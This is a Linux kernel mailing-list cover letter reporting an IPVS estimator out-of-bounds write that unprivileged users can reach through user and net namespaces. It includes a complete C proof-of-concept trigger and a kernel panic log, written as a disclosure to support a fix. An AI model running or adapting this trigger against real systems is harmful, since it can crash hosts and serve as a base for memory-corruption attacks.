Received: from mail-pg1-f181.google.com (mail-pg1-f181.google.com [209.85.215.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D728A423775
	for <netfilter-devel@vger.kernel.org>; Mon, 27 Jul 2026 16:58:09 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785171494; cv=none; b=lO5eDvnTpd4hNwKos2JpLzyTkN+lj/IrMw8jCzT572HVzVF+jJRblEytmkCYNRaMLJwLFYekjuClnFfzcaK0lKxOB7FITrLY9bwhVyGjBKf9823cziGYP/IkPkksacCT9q7uHM/Q0OUUwe6/Im6yIYzVY4U9ovOVS+lvbCGpO4E=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785171494; c=relaxed/simple;
	bh=oKZqA8E4Um1JJmWoRJI2iaOqbR4CvZD/hYJQcMxwliA=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=D9nl8JqwA51HV415C14/xyPsZPiYlzvLleoDlbAvvleWMiEsGPin9EuPmXxEsEGRKdHsxSlxXPNja4I9Sz5d24kUQPsbGl+gJD52ugkgHWGST3wn+mRiY8ZmN1lvX0NMGoRgK8FjttdZUcniTytU05AQEM0NQDCi2SxZkxIKnSo=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Y5yKd/UQ; arc=none smtp.client-ip=209.85.215.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Y5yKd/UQ"
Received: by mail-pg1-f181.google.com with SMTP id 41be03b00d2f7-c96b08cdd1cso2139228a12.0
        for <netfilter-devel@vger.kernel.org>; Mon, 27 Jul 2026 09:58:08 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785171487; x=1785776287; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=eNOwjTcAWwqRgNa7w8hflEjodYciqyNZBNiWFOom9S8=;
        b=Y5yKd/UQFmu1OUosnnXythuuYfLuKA14/d1uOXoVZRR+aqVm3pSDwUgoTBXNG12SNv
         xJF7X9wgPnaVeIBQLx4vlkojAG/plFvEUj+h/3v4/DJkXem76PxzUr0VnElXI9CXGows
         u/noLyqzXu6l2hV1d47J+8D/Yns3UhY8XwAKehaf3QO1b4EEesaoiZWco+odZUHVYNDx
         WA3onTiwxf5N8TQrxo9E/9IThMFSzju0SFaJZgLsUR0To3YJTjyUZt6tqmav8QxQl/hY
         U0ebnlWl6+5tWr6XrCrm1/xiDnk52dnlCI/syMu3MIWT8QXKKNqOdVFRENu0YWXyOqUm
         Z1LA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785171487; x=1785776287;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=eNOwjTcAWwqRgNa7w8hflEjodYciqyNZBNiWFOom9S8=;
        b=cPkbo/4uVsak5MCrQ7N7WSFgFP3/tOrHVwDSPKsA8/yvLlqe6LyfkRiRO8Op3ofldg
         82l3r9jYQucZfQS4Dopd1viKYW72wHPZCI46lNaaoNkrXIcayisWj5R/fWsfiDniRjWb
         VrK3p5QvEoief9vZW4MkNjAoHkLv94K6xgwIroOZDds0Ex/GUxn7GKbTACF7uyGsyiwJ
         z4kEg0w4y8KonJOuHrS/QT5JfI9JTn9mjtLPooueT/vn1zyNPVyJPRCPDG6JWEoS4JA/
         rsT5cGeEn/VqOPoGf0Xlmsz5ydj1549rjaQ7NEPAREvrtyz6jQuSJvv92c4Yxrfb9i4R
         6ziQ==
X-Forwarded-Encrypted: i=1; AHgh+Rptl9YtfF6bsztMoxSwmjCHEL+waCVfl8ZPstnfRHSrqXv7yQ5NKvWVCQEvYllO3eLrV1fSIFT2JCjoq84l/iw=@vger.kernel.org
X-Gm-Message-State: AOJu0YwVwb+4WZy1bSryID6sd0gFMGDwYw1hpE0TXTqWe6Z7fqrSweeB
	hTJUEhMVsaTrSk/bwg1ljaODwEqXIo1VCddJW+XTbmXpWK/hag5bXG6V
X-Gm-Gg: AR+sD11Ppx3JQl7UFW4F2aO3hgrg/74hmxrdQu5voSLxcgf8Zq4wvZlI7sGxM0Yf9qX
	nf1gDCosCAVpoXsWwFTlgVoBJFlkRTzq640ktIr0ocSabhMB6KdF+FiHI0KzRENChYclALvoTjS
	vtpv0gxTLidarXZK9l1FAjAc3pgqZvxs+XyP/uEkRYYmLbSTsVfUfoerNJriBRm1vuvbiTSnh+k
	jj0bA2uaysJHkECjqlK3KTn3xO7UcXUntOH97FugRgToJateSCZJwM+kJZHiNafoQD15c92e7D0
	1VKAH/XZwQHLLjdhdXpSRE1jLkNRJI5GSxqtr8PHy3moaTjS3EcCD/Vs8Oa30qIIvYBBJsVxXQM
	7DSMoERhE8JoZ2LtPM3vhgstr2wsEdEiMirF6V0AGCsQjb7it2oeo4j8jRG/8PVqH2WOldk3FMe
	dBIGpo80de3PfAnLJVTDx84TRULlM47dfz7KpLYtOqnHJLIy6gi8DYdAyJcBF3ZaPadp27tm1mL
	ae4S/yJ
X-Received: by 2002:a05:6a21:918c:b0:3bf:6c08:fb85 with SMTP id adf61e73a8af0-3c67e0e92fdmr8936363637.53.1785171486869;
        Mon, 27 Jul 2026 09:58:06 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cbbb66b282asm3653821a12.18.2026.07.27.09.58.03
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 09:58:06 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: lvs-devel@vger.kernel.org,
	netfilter-devel@vger.kernel.org
Cc: horms@verge.net.au,
	ja@ssi.bg,
	pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	jwiesner@suse.de,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH nf 0/1] ipvs: guard estimator enqueue until limits are set
Date: Tue, 28 Jul 2026 00:58:00 +0800
Message-ID: <cover.1784878022.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/ipvs/ip_vs_est.c. The
bug is reachable by a non-root user via user and net namespace.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

IPVS estimator kthread 0 starts with zero chain and tick limits until
its initial calculation phase completes. If network namespace teardown
clears ipvs->enable during this initial calculation, the calculation
phase can return without installing positive est_chain_max and
per-kthread limits.

After this early return, kthread 0 can still drain est_temp_list. Each
enqueue then observes zero chain_max, tick_max and est_max_count values.
The zero chain_max makes each chain immediately full, while est_count
can never equal the zero est_max_count after it is incremented. After
all 50 tick rows are consumed, the row lookup returns IPVS_EST_NTICKS.

ip_vs_enqueue_estimator() then indexes kd->ticks[50] and
kd->tick_len[50], writing past the arrays and corrupting adjacent
kthread state.

The fix avoids draining temporary estimators before est_chain_max is
ready, rejects enqueue attempts without valid per-kthread limits, and
rejects row lookups that did not find a valid tick row.

Reproducer:

    ./poc -U -n 500 -s 80 -d 5000

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define STACK_SIZE (1024 * 1024)

#define IP_VS_SCHEDNAME_MAXLEN 16
#define IP_VS_BASE_CTL (64 + 1024 + 64)
#define IP_VS_SO_SET_ADD (IP_VS_BASE_CTL + 2)

struct ip_vs_service_user {
	uint16_t protocol;
	uint32_t addr;
	uint16_t port;
	uint32_t fwmark;
	char sched_name[IP_VS_SCHEDNAME_MAXLEN];
	unsigned int flags;
	unsigned int timeout;
	uint32_t netmask;
};

struct trigger_cfg {
	int attempts;
	int services;
	int delay_us;
	bool use_userns;
};

struct userns_child_args {
	int sync_fd;
	int services;
	int delay_us;
};

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static int write_file(const char *path, const char *buf)
{
	FILE *f = fopen(path, "w");

	if (!f)
		return -1;
	if (fputs(buf, f) == EOF) {
		fclose(f);
		return -1;
	}
	if (fclose(f) != 0)
		return -1;
	return 0;
}

static int add_service(int fd, int idx)
{
	struct ip_vs_service_user svc;

	memset(&svc, 0, sizeof(svc));
	svc.protocol = IPPROTO_TCP;
	svc.addr = htonl(0x7f000001U);
	svc.port = htons((uint16_t)(10000 + idx));
	memcpy(svc.sched_name, "rr", 3);

	return setsockopt(fd, IPPROTO_IP, IP_VS_SO_SET_ADD, &svc, sizeof(svc));
}

static int trigger_once_current_ns(int services, int delay_us)
{
	int fd;
	int i;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		return -1;

	if (add_service(fd, 0) < 0) {
		close(fd);
		return -1;
	}

	if (delay_us > 0)
		usleep((useconds_t)delay_us);

	for (i = 1; i < services; i++) {
		if (add_service(fd, i) < 0) {
			close(fd);
			return -1;
		}
	}

	close(fd);
	return 0;
}

static int rootnet_child(void *arg)
{
	const struct trigger_cfg *cfg = arg;

	if (unshare(CLONE_NEWNET) < 0) {
		perror("unshare(CLONE_NEWNET)");
		return 1;
	}

	if (trigger_once_current_ns(cfg->services, cfg->delay_us) < 0) {
		perror("trigger_once_current_ns");
		return 1;
	}

	return 0;
}

static int usernet_child(void *arg)
{
	const struct userns_child_args *cfg = arg;
	char dummy;

	if (read(cfg->sync_fd, &dummy, 1) != 1) {
		perror("child read");
		return 1;
	}
	close(cfg->sync_fd);

	if (setresgid(0, 0, 0) < 0) {
		perror("setresgid");
		return 1;
	}
	if (setresuid(0, 0, 0) < 0) {
		perror("setresuid");
		return 1;
	}

	if (trigger_once_current_ns(cfg->services, cfg->delay_us) < 0) {
		perror("trigger_once_current_ns");
		return 1;
	}

	return 0;
}

static int map_userns(pid_t pid, uid_t uid, gid_t gid)
{
	char path[128];
	char map[128];

	snprintf(path, sizeof(path), "/proc/%d/setgroups", pid);
	if (write_file(path, "deny\n") < 0 && errno != ENOENT) {
		perror("write setgroups");
		return -1;
	}

	snprintf(path, sizeof(path), "/proc/%d/uid_map", pid);
	snprintf(map, sizeof(map), "0 %u 1\n", uid);
	if (write_file(path, map) < 0) {
		perror("write uid_map");
		return -1;
	}

	snprintf(path, sizeof(path), "/proc/%d/gid_map", pid);
	snprintf(map, sizeof(map), "0 %u 1\n", gid);
	if (write_file(path, map) < 0) {
		perror("write gid_map");
		return -1;
	}

	return 0;
}

static int run_root_attempt(const struct trigger_cfg *cfg)
{
	void *stack;
	pid_t pid;
	int status;

	stack = malloc(STACK_SIZE);
	if (!stack)
		die("malloc");

	pid = clone(rootnet_child, (char *)stack + STACK_SIZE, SIGCHLD, (void *)cfg);
	if (pid < 0)
		die("clone root");

	if (waitpid(pid, &status, 0) < 0)
		die("waitpid root");

	free(stack);
	return status;
}

static int run_userns_attempt(const struct trigger_cfg *cfg)
{
	struct userns_child_args args;
	void *stack;
	int pipefd[2];
	pid_t pid;
	int status;

	if (pipe(pipefd) < 0)
		die("pipe");

	args.sync_fd = pipefd[0];
	args.services = cfg->services;
	args.delay_us = cfg->delay_us;

	stack = malloc(STACK_SIZE);
	if (!stack)
		die("malloc");

	pid = clone(usernet_child, (char *)stack + STACK_SIZE,
		    CLONE_NEWUSER | CLONE_NEWNET | SIGCHLD, &args);
	if (pid < 0)
		die("clone userns");

	close(pipefd[0]);

	if (map_userns(pid, getuid(), getgid()) < 0)
		exit(EXIT_FAILURE);

	if (write(pipefd[1], "x", 1) != 1)
		die("write sync");
	close(pipefd[1]);

	if (waitpid(pid, &status, 0) < 0)
		die("waitpid userns");

	free(stack);
	return status;
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-n attempts] [-s services] [-d delay_us] [-U]\n"
		"  -U  create a user+net namespace before triggering\n",
		prog);
}

int main(int argc, char **argv)
{
	struct trigger_cfg cfg = {
		.attempts = 2000,
		.services = 80,
		.delay_us = 5000,
		.use_userns = false,
	};
	int opt;
	int i;

	while ((opt = getopt(argc, argv, "Un:s:d:h")) != -1) {
		switch (opt) {
		case 'U':
			cfg.use_userns = true;
			break;
		case 'n':
			cfg.attempts = atoi(optarg);
			break;
		case 's':
			cfg.services = atoi(optarg);
			break;
		case 'd':
			cfg.delay_us = atoi(optarg);
			break;
		case 'h':
		default:
			usage(argv[0]);
			return opt == 'h' ? 0 : 1;
		}
	}

	if (cfg.attempts <= 0 || cfg.services < 60 || cfg.delay_us < 0) {
		fprintf(stderr, "need attempts > 0, services >= 60, delay_us >= 0\n");
		return 1;
	}

	fprintf(stderr,
		"mode=%s attempts=%d services=%d delay_us=%d\n",
		cfg.use_userns ? "userns+netns" : "root+netns",
		cfg.attempts, cfg.services, cfg.delay_us);

	for (i = 1; i <= cfg.attempts; i++) {
		int status;

		status = cfg.use_userns ? run_userns_attempt(&cfg)
					: run_root_attempt(&cfg);
		if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
			fprintf(stderr, "attempt %d failed: status=0x%x\n", i, status);
			return 1;
		}

		if ((i % 100) == 0)
			fprintf(stderr, "completed %d attempts\n", i);
	}

	fprintf(stderr, "completed without crashing the kernel\n");
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  111.027019] ------------[ cut here ]------------
[  111.028417] UBSAN: array-index-out-of-bounds in ../net/netfilter/ipvs/ip_vs_est.c:444:7
[  111.029599] index 50 is out of range for type 'ip_vs_est_tick_data *[50]'
[  111.030622] CPU: 2 UID: 0 PID: 906 Comm: ipvs-e:7:0 Not tainted 6.12.95 #1
[  111.030629] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  111.030631] Call Trace:
[  111.030643]  <TASK>
[  111.030651]  dump_stack_lvl (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/irqflags.h:26 /home/roxy/linux-block-patch/build/../arch/x86/include/asm/irqflags.h:109 /home/roxy/linux-block-patch/build/../arch/x86/include/asm/irqflags.h:151 /home/roxy/linux-block-patch/build/../lib/dump_stack.c:118)
[  111.030721]  __ubsan_handle_out_of_bounds (/home/roxy/linux-block-patch/build/../lib/ubsan.c:455)
[  111.030763]  ip_vs_estimation_kthread (/home/roxy/linux-block-patch/build/../net/netfilter/ipvs/ip_vs_est.c:153 /home/roxy/linux-block-patch/build/../net/netfilter/ipvs/ip_vs_est.c:216)
[  111.030797]  ? ttwu_queue_wakelist (/home/roxy/linux-block-patch/build/../kernel/sched/core.c:3891 (discriminator 2) /home/roxy/linux-block-patch/build/../kernel/sched/core.c:3934 (discriminator 2) /home/roxy/linux-block-patch/build/../kernel/sched/core.c:3959 (discriminator 2))
[  111.030836]  ? raw_spin_rq_lock_nested.constprop.0+0x19/0x70
[  111.030842]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  111.030861]  ? __pfx_autoremove_wake_function (/home/roxy/linux-block-patch/build/../include/linux/list.h:204 (discriminator 2))
[  111.030886]  ? __pfx_ip_vs_estimation_kthread (/home/roxy/linux-block-patch/build/../net/netfilter/ipvs/ip_vs_est.c:592)
[  111.030891]  kthread (/home/roxy/linux-block-patch/build/../kernel/kthread.c:401)
[  111.030901]  ? __pfx_kthread (/home/roxy/linux-block-patch/build/../include/linux/list.h:162)
[  111.030905]  ret_from_fork (/home/roxy/linux-block-patch/build/../arch/x86/kernel/process.c:153)
[  111.030927]  ? __pfx_kthread (/home/roxy/linux-block-patch/build/../include/linux/list.h:162)
[  111.030931]  ret_from_fork_asm (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:245)
[  111.030959]  </TASK>
[  111.042284] ---[ end trace ]---
[  111.042809] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
[  111.043711] CPU: 2 UID: 0 PID: 906 Comm: ipvs-e:7:0 Not tainted 6.12.95 #1
[  111.044895] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  111.046408] Call Trace:
[  111.046746]  <TASK>
[  111.047043]  panic (/home/roxy/linux-block-patch/build/../kernel/panic.c:955 (discriminator 1))
[  111.047498]  ? _printk (/home/roxy/linux-block-patch/build/../kernel/printk/printk.c:2499)
[  111.047953]  check_panic_on_warn (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/atomic.h:85 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/atomic/atomic-arch-fallback.h:564 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/atomic/atomic-arch-fallback.h:1020 (discriminator 4) /home/roxy/linux-block-patch/build/../include/linux/atomic/atomic-instrumented.h:454 (discriminator 4) /home/roxy/linux-block-patch/build/../kernel/panic.c:527 (discriminator 4))
[  111.048522]  __ubsan_handle_out_of_bounds (/home/roxy/linux-block-patch/build/../lib/ubsan.c:456)
[  111.049196]  ip_vs_estimation_kthread (/home/roxy/linux-block-patch/build/../net/netfilter/ipvs/ip_vs_est.c:153 /home/roxy/linux-block-patch/build/../net/netfilter/ipvs/ip_vs_est.c:216)
[  111.049856]  ? ttwu_queue_wakelist (/home/roxy/linux-block-patch/build/../kernel/sched/core.c:3891 (discriminator 2) /home/roxy/linux-block-patch/build/../kernel/sched/core.c:3934 (discriminator 2) /home/roxy/linux-block-patch/build/../kernel/sched/core.c:3959 (discriminator 2))
[  111.050477]  ? raw_spin_rq_lock_nested.constprop.0+0x19/0x70
[  111.051274]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  111.051947]  ? __pfx_autoremove_wake_function (/home/roxy/linux-block-patch/build/../include/linux/list.h:204 (discriminator 2))
[  111.052658]  ? __pfx_ip_vs_estimation_kthread (/home/roxy/linux-block-patch/build/../net/netfilter/ipvs/ip_vs_est.c:592)
[  111.053370]  kthread (/home/roxy/linux-block-patch/build/../kernel/kthread.c:401)
[  111.053807]  ? __pfx_kthread (/home/roxy/linux-block-patch/build/../include/linux/list.h:162)
[  111.054352]  ret_from_fork (/home/roxy/linux-block-patch/build/../arch/x86/kernel/process.c:153)
[  111.054842]  ? __pfx_kthread (/home/roxy/linux-block-patch/build/../include/linux/list.h:162)
[  111.055361]  ret_from_fork_asm (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:245)
[  111.055898]  </TASK>
[  111.056531] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ipvs: guard estimator enqueue until limits are set

 net/netfilter/ipvs/ip_vs_est.c | 12 +++++++++++-
 1 file changed, 11 insertions(+), 1 deletion(-)

-- 
2.43.0
